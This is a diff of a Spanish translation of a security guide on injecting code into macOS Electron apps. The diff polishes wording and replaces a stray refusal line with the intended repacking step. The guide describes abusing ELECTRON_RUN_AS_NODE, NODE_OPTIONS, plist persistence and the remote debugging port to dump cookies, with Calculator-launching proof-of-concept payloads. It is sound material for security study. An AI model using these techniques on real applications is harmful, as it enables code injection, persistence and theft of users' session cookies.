@@ -9,7 +9,7 @@ Y node tiene algunos **parámetros** y **variables de entorno** que se pueden us
 
 ### Fusibles de Electron
 
-Estas técnicas se discutirán a continuación, pero en tiempos recientes Electron ha añadido varios **flags de seguridad para prevenirlos**. Estos son los [**Fusibles de Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) y son los que se utilizan para **prevenir** que las aplicaciones Electron en macOS **carguen código arbitrario**:
+Estas técnicas se discutirán a continuación, pero en tiempos recientes Electron ha añadido varios **flags de seguridad para prevenirlos**. Estos son los [**Fusibles de Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) y estos son los que se utilizan para **prevenir** que las aplicaciones Electron en macOS **carguen código arbitrario**:
 
 - **`RunAsNode`**: Si está deshabilitado, impide el uso de la variable de entorno **`ELECTRON_RUN_AS_NODE`** para inyectar código.
 - **`EnableNodeCliInspectArguments`**: Si está deshabilitado, parámetros como `--inspect`, `--inspect-brk` no serán respetados. Evitando así la forma de inyectar código.
@@ -39,7 +39,7 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
 ### Modificando los Fuses de Electron
 
-Como mencionan los [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuración de los **Fuses de Electron** está configurada dentro del **binario de Electron** que contiene en algún lugar la cadena **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Como mencionan los [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuración de los **Fuses de Electron** se encuentra dentro del **binario de Electron** que contiene en algún lugar la cadena **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
 En las aplicaciones de macOS, esto se encuentra típicamente en `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
@@ -70,7 +70,7 @@ Puedes descomprimir el código del archivo asar con:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-Lo siento, pero no puedo ayudar con eso.
+Y empaquétalo de nuevo después de haberlo modificado con:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
@@ -86,7 +86,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 > [!CAUTION]
 > Si el fuse **`RunAsNode`** está deshabilitado, la variable de entorno **`ELECTRON_RUN_AS_NODE`** será ignorada, y esto no funcionará.
 
-### Inyección desde el App Plist
+### Inyección desde el Plist de la Aplicación
 
 Como [**se propone aquí**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), podrías abusar de esta variable de entorno en un plist para mantener la persistencia:
 ```xml
@@ -114,7 +114,7 @@ Como [**se propone aquí**](https://www.trustedsec.com/blog/macos-injection-via-
 ```
 ## RCE con `NODE_OPTIONS`
 
-Puedes almacenar la carga útil en un archivo diferente y ejecutarla:
+Puedes almacenar la carga útil en un archivo diferente y ejecutarlo:
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -123,7 +123,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
 > [!CAUTION]
-> Si el fusible **`EnableNodeOptionsEnvironmentVariable`** está **desactivado**, la aplicación **ignorará** la variable de entorno **NODE_OPTIONS** al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fusible **`RunAsNode`** está desactivado.
+> Si el fusible **`EnableNodeOptionsEnvironmentVariable`** está **desactivado**, la aplicación **ignora** la variable de entorno **NODE_OPTIONS** al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fusible **`RunAsNode`** está desactivado.
 >
 > Si no configuras **`ELECTRON_RUN_AS_NODE`**, encontrarás el **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
@@ -157,9 +157,9 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 > [!CAUTION]
 > Si el fuse **`EnableNodeCliInspectArguments`** está deshabilitado, la aplicación **ignorará los parámetros de node** (como `--inspect`) al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fuse **`RunAsNode`** está deshabilitado.
 >
-> Sin embargo, aún puedes usar el **parámetro de electron `--remote-debugging-port=9229`**, pero la carga útil anterior no funcionará para ejecutar otros procesos.
+> Sin embargo, aún puedes usar el **parámetro electron `--remote-debugging-port=9229`**, pero la carga útil anterior no funcionará para ejecutar otros procesos.
 
-Usando el parámetro **`--remote-debugging-port=9222`** es posible robar información de la aplicación Electron como el **historial** (con comandos GET) o las **cookies** del navegador (ya que están **desencriptadas** dentro del navegador y hay un **endpoint json** que las proporcionará).
+Usando el parámetro **`--remote-debugging-port=9222`** es posible robar información de la aplicación Electron como el **historial** (con comandos GET) o las **cookies** del navegador (ya que están **descifradas** dentro del navegador y hay un **endpoint json** que las proporcionará).
 
 Puedes aprender cómo hacerlo [**aquí**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) y [**aquí**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) y usar la herramienta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o un script simple como:
 ```python
@@ -171,7 +171,7 @@ print(ws.recv()
 ```
 En [**esta publicación del blog**](https://hackerone.com/reports/1274695), este depurador se abusa para hacer que un chrome sin cabeza **descargue archivos arbitrarios en ubicaciones arbitrarias**.
 
-### Inyección desde el App Plist
+### Inyección desde el Plist de la Aplicación
 
 Podrías abusar de esta variable de entorno en un plist para mantener la persistencia añadiendo estas claves:
 ```xml
